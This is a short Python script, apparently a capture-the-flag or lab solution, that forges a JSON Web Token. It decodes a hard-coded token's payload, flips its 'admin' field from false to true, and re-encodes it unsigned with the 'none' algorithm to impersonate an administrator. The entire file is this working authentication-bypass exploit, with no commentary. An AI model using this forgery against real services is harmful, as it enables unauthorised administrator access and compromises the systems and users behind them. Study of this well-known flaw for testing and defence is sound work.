import jwt
import base64
import json

key = None
token1 = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImR1bXAiLCJhZG1pbiI6ZmFsc2V9.PHgPo7wouCjKelioEqMo_4skHJcur-bsCPmVS1ZymNA"
jwtdata = token1.split(".")[1]
jwtdata = base64.b64decode(jwtdata).decode('utf-8')
jwtdata = json.loads(jwtdata)
jwtdata["admin"]=True


print(jwt.encode(jwtdata, key, algorithm="none"))
